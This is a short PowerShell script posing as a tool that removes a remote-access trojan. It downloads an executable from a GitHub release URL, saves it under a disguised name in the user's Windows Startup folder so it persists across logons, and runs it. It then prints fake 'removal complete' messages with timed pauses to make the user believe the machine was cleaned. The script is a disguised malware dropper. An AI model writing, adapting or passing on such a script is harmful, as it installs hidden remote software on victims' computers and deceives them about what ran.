Write-Host "Finding Remote Access Files..."
$url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
$dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$fn = "PYUpdater.exe"
if (-not (Test-Path -Path $dest)) {
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
}
$fp = Join-Path -Path $dest -ChildPath $fn
$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $fp
    Start-Process -FilePath $fp
} catch {
    Write-Error "Download or execution failed: $_"
}
Write-Host "Removing Temporary Account Data Files..."
Start-Sleep -Milliseconds 300
Write-Host "Removing RAT File..."
Start-Sleep -Milliseconds 220
Write-Host "Removing RAT from Startup Folder..."
Start-Sleep -Milliseconds 280
Write-Host "Removal Complete!"
Write-Host "Closing Window."
Start-Sleep -Milliseconds 120
